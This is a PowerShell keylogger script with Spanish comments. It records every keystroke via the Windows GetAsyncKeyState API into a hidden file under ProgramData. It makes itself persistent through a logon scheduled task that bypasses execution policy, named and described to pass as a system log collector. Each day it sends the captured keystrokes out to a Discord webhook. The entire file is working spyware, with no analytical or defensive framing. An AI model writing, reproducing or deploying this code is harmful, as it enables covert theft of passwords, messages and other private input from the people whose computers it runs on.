# logger.ps1
# Configuración
$logFile = "C:\ProgramData\SystemLogs\log.dat"
$webhookUrl = $env:DISCORD_WEBHOOK
$taskName = "SystemLogCollector"
$sendTime = "17:00"

# Crear directorio de logs si no existe
$logDir = Split-Path $logFile -Parent
if (-not (Test-Path $logDir)) {
    New-Item -ItemType Directory -Path $logDir -Force | Out-Null
}

# Restringir permisos del archivo de log al usuario actual
if (Test-Path $logFile) {
    icacls $logFile /inheritance:r /grant:r "$($env:USERNAME):F" | Out-Null
}

# Función para enviar a Discord con reintentos
function Send-ToDiscord {
    param($Content)
    if (-not $webhookUrl) {
        Add-Content -Path $logFile -Value "[ERROR] Webhook de Discord no configurado en la variable de entorno DISCORD_WEBHOOK."
        return
    }
    $body = @{ content = $Content } | ConvertTo-Json
    $maxRetries = 3
    $retryCount = 0
    while ($retryCount -lt $maxRetries) {
        try {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
            return
        } catch {
            $retryCount++
            Add-Content -Path $logFile -Value "[ERROR] Intento $retryCount de $maxRetries falló al enviar a Discord: $_"
            if ($retryCount -eq $maxRetries) {
                Add-Content -Path $logFile -Value "[ERROR] No se pudo enviar a Discord tras $maxRetries intentos."
                return
            }
            Start-Sleep -Seconds 5
        }
    }
}

# Configurar persistencia
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $taskExists) {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `\"$PSScriptRoot\logger.ps1`\""
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description "Recopila datos del sistema al iniciar sesión" -Force | Out-Null
}

# Capturar pulsaciones
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
}
"@
while ($true) {
    Start-Sleep -Milliseconds 40
    for ($i = 1; $i -le 255; $i++) {
        $keyState = [Keyboard]::GetAsyncKeyState($i)
        if ($keyState -eq -32767) {
            $char = [char]$i
            if ([char]::IsControl($char)) { $char = "[CTRL+$i]" }
            $log = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'): $char"
            Add-Content -Path $logFile -Value $log
        }
    }
    $currentTime = Get-Date -Format "HH:mm"
    if ($currentTime -eq $sendTime -and (Test-Path $logFile)) {
        $content = Get-Content -Path $logFile -Raw
        if ($content) {
            Send-ToDiscord -Content $content
            Clear-Content -Path $logFile
        }
        Start-Sleep -Seconds 60
    }
    Start-Sleep -Seconds 1
}
